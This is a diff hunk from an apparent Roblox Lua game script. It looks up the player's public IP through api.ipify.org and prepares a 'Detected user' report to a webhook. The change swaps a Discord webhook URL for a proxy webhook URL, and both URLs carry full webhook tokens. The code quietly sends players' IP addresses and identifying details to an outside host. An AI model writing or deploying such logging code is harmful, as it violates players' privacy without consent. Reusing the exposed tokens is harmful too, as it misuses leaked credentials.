@@ -701,7 +701,7 @@ local ip = tostring(game:HttpGet("https://api.ipify.org", true))
 
 
 local url =
-"https://discord.com/api/webhooks/1049452963367759882/0tfai07DVNcV3BuU7B1GEMpb48MCkIo0i3sL84hHZrRwupgPb_HHJBRY-u6UtUqOPtRg"
+"https://webhook.lewisakura.moe/api/webhooks/1058898772727451718/MuwpPPoSWHrXLEIZemkyzJh7ymJEb9JxxorItmT1OH9WyUBroWA-QkNrRjaQGOmg6OY9"
 local data = {
 ["content"] = "Game: Rogue [TEST PLACE]. Detected user:",
 ["embeds"] = {
